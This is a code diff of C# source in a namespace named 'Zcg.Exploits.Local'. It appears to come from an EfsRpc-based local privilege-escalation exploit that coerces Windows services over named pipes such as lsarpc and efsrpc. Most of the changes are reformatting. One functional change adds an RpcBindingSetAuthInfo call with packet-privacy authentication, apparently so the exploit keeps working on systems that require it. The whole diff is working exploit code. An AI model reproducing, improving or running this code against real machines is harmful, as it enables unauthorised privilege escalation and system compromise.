@@ -33,15 +33,17 @@ namespace Zcg.Exploits.Local
             string pipe = "lsarpc";
             if (args.Length >= 2)
             {
-                if ((new List<string> { "lsarpc", "efsrpc", "samr", "lsass", "netlogon" }).Contains(args[1], StringComparer.OrdinalIgnoreCase)){
-                    pipe = args[1];     
+                if ((new List<string> { "lsarpc", "efsrpc", "samr", "lsass", "netlogon" }).Contains(args[1], StringComparer.OrdinalIgnoreCase))
+                {
+                    pipe = args[1];
                 }
-                else {
+                else
+                {
                     usage();
                     return;
                 }
             }
-            
+
             LUID_AND_ATTRIBUTES[] l = new LUID_AND_ATTRIBUTES[1];
             using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
             {
@@ -254,17 +256,19 @@ namespace Zcg.Exploits.Local
     //some changed for MS-EFSR
     class EfsrTiny
     {
-        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFromStringBindingW",CallingConvention = CallingConvention.StdCall,CharSet = CharSet.Unicode, SetLastError = false)]
+        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFromStringBindingW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
         private static extern Int32 RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);
+        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetAuthInfoW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
+        private static extern Int32 RpcBindingSetAuthInfo(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr AuthIdentity, UInt32 AuthzSvc);
 
-        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl,CharSet = CharSet.Unicode, SetLastError = false)]
+        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
         private static extern IntPtr NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);
 
-        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFree", CallingConvention = CallingConvention.StdCall,CharSet = CharSet.Unicode, SetLastError = false)]
+        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFree", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
         private static extern Int32 RpcBindingFree(ref IntPtr lpString);
 
-        [DllImport("Rpcrt4.dll", EntryPoint = "RpcStringBindingComposeW", CallingConvention = CallingConvention.StdCall,CharSet = CharSet.Unicode, SetLastError = false)]
-        private static extern Int32 RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options,out IntPtr lpBindingString);
+        [DllImport("Rpcrt4.dll", EntryPoint = "RpcStringBindingComposeW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
+        private static extern Int32 RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString);
 
         [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetOption", CallingConvention = CallingConvention.StdCall, SetLastError = false)]
         private static extern Int32 RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);
@@ -273,7 +277,7 @@ namespace Zcg.Exploits.Local
         internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, string FileName);
 
         private static byte[] MIDL_ProcFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x0c, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00 };
-        
+
         private static byte[] MIDL_ProcFormatStringx64 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x18, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x0a, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00 };
 
         private static byte[] MIDL_TypeFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };
@@ -290,9 +294,9 @@ namespace Zcg.Exploits.Local
                 {"lsass", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
                 {"netlogon", "c681d488-d850-11d0-8c52-00c04fd90f7e"}
             };
-            
+
             interfaceId = new Guid(bindingMapping[pipe]);
-            
+
             pipe = String.Format("\\pipe\\{0}", pipe);
             Console.WriteLine("[+] Pipe: " + pipe);
             if (IntPtr.Size == 8)
@@ -420,6 +424,12 @@ namespace Zcg.Exploits.Local
             {
                 Console.WriteLine("[x] RpcBindingFromStringBinding failed with status 0x" + status.ToString("x"));
                 return IntPtr.Zero;
+            }
+
+            status = RpcBindingSetAuthInfo(binding, server, /* RPC_C_AUTHN_LEVEL_PKT_PRIVACY */ 6, /* RPC_C_AUTHN_GSS_NEGOTIATE */ 9, IntPtr.Zero, AuthzSvc: 16);
+            if (status != 0)
+            {
+                Console.WriteLine("[x] RpcBindingSetAuthInfo failed with status 0x" + status.ToString("x"));
             }
 
             status = RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
